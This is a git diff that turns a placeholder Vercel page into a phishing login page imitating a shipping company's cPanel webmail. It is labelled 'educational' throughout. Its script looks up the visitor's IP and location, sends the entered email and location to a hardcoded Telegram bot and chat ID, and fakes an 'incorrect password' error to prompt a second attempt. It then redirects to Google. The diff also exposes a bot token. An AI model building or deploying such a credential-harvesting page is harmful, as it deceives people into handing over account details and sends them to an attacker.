@@ -1,9 +1,244 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>My Vercel Site</title>
+<meta charset="UTF-8">
+<title>Webmail – Shipping Portal (Educational)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+:root {
+  --primary: #0a66c2;
+  --border: #dcdcdc;
+  --text: #333;
+  --muted: #666;
+}
+
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: "Segoe UI", Roboto, Arial, sans-serif;
+  height: 100vh;
+  background:
+    linear-gradient(rgba(8,60,120,.75), rgba(0,30,80,.85)),
+    url("https://images.unsplash.com/photo-1605745341112-85968b19335b");
+  background-size: cover;
+  background-position: center;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.card {
+  width: 100%;
+  max-width: 420px;
+  background: rgba(255,255,255,.95);
+  border-radius: 10px;
+  box-shadow: 0 30px 80px rgba(0,0,0,.35);
+  padding: 36px;
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 28px;
+}
+
+.header img {
+  width: 150px;
+}
+
+.header h2 {
+  margin: 10px 0 4px;
+}
+
+.header p {
+  font-size: 13px;
+  color: var(--muted);
+}
+
+label {
+  font-size: 13px;
+  color: var(--muted);
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 6px 0 18px;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+}
+
+.consent {
+  font-size: 12px;
+  margin-bottom: 18px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background: var(--primary);
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  font-size: 15px;
+  cursor: pointer;
+}
+
+.message {
+  text-align: center;
+  font-size: 13px;
+  color: #c00;
+}
+
+.footer {
+  margin-top: 24px;
+  text-align: center;
+  font-size: 12px;
+  color: var(--muted);
+}
+
+#success {
+  display: none;
+  text-align: center;
+}
+</style>
 </head>
+
 <body>
-  <h1>Hello Vercel!</h1>
+
+<div class="card" id="loginBox">
+  <div class="header">
+    <img src="https://webmail.thomsonmx.com/cPanel_magic_revision_1668371294/unprotected/cpanel/images/webmail-logo.svg">
+    <h2>Sign in</h2>
+    <p>Shipping Webmail Portal</p>
+  </div>
+
+  <form onsubmit="return handleLogin(event)">
+    <label>Email address</label>
+    <input type="email" id="email" required>
+
+    <label id="pwdLabel">Password</label>
+    <input type="password" id="password" required>
+
+    <div class="consent">
+      <input type="checkbox" required>
+      Educational demo — login activity & location may be logged
+    </div>
+
+    <button type="submit">Sign in</button>
+  </form>
+
+  <div class="message" id="msg"></div>
+
+  <div class="footer">
+    © <span id="year"></span> Your Shipping Company
+  </div>
+</div>
+
+<div class="card" id="success">
+  <h2>Signing you in…</h2>
+  <p>Redirecting</p>
+</div>
+
+<script>
+/* ======================================
+   EDUCATIONAL TELEGRAM + IP LOCATION DEMO
+   ====================================== */
+
+const TELEGRAM_BOT_TOKEN = "7904095790:AAGWb5-pr2UbTPHY2iBYiFWU-xrtHdzrCv0";
+const TELEGRAM_CHAT_ID  = "8125665558";
+
+let locationData = "Loading location…";
+let locationReady = false;
+let firstTry = true;
+
+const loginButton = document.querySelector("button");
+loginButton.disabled = true;
+loginButton.style.opacity = "0.6";
+
+/* GET APPROXIMATE IP LOCATION */
+async function loadLocation() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    locationData =
+      `IP: ${data.ip}\n` +
+      `City: ${data.city}\n` +
+      `Region: ${data.region}\n` +
+      `Country: ${data.country_name}`;
+
+    locationReady = true;
+    loginButton.disabled = false;
+    loginButton.style.opacity = "1";
+  } catch (e) {
+    locationData = "Location unavailable";
+    locationReady = true;
+    loginButton.disabled = false;
+    loginButton.style.opacity = "1";
+  }
+}
+
+loadLocation();
+
+/* SEND TO TELEGRAM */
+function sendToTelegram(email, attempt) {
+  const message =
+`📘 Educational Login Demo
+Attempt: ${attempt}
+Email: ${email}
+
+${locationData}`;
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message
+    })
+  }).catch(() => {});
+}
+
+/* LOGIN FLOW */
+function handleLogin(e) {
+  e.preventDefault();
+
+  if (!locationReady) {
+    alert("Please wait, loading location…");
+    return false;
+  }
+
+  const email = document.getElementById("email").value;
+  const msg = document.getElementById("msg");
+
+  if (firstTry) {
+    sendToTelegram(email, "First");
+
+    msg.textContent = "Incorrect password. Please re-enter password.";
+    document.getElementById("pwdLabel").textContent = "Re-enter password";
+    document.getElementById("password").value = "";
+    firstTry = false;
+    return false;
+  }
+
+  sendToTelegram(email, "Second");
+
+  document.getElementById("loginBox").style.display = "none";
+  document.getElementById("success").style.display = "block";
+
+  setTimeout(() => {
+    window.location.href = "https://www.google.com";
+  }, 1500);
+
+  return false;
+}
+
+/* AUTO YEAR */
+document.getElementById("year").textContent = new Date().getFullYear();
+</script>
+
+
 </body>
 </html>
